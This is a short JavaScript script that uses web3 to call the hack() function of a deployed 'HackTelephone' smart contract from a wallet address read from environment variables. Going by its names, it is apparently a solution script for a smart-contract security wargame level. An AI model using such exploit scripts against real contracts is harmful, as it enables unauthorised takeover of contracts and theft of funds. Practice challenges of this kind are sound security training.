const { web3, dotenv } = require("./common.js");
dotenv.config();
const abi = require("./build/contracts/HackTelephone.json").abi;

(async () => {
  try {
    let contract = new web3.eth.Contract(
      abi,
      "0xa45655CA0C2e6577Ad8528Ea7B7C378620fb9c64" // Deployed Contract
    );
    await contract.methods.hack().send({ from: process.env.WALLET_ADDRESS });
    console.log("Hacked");
  } catch (e) {
    console.log(e.message);
  }
})();
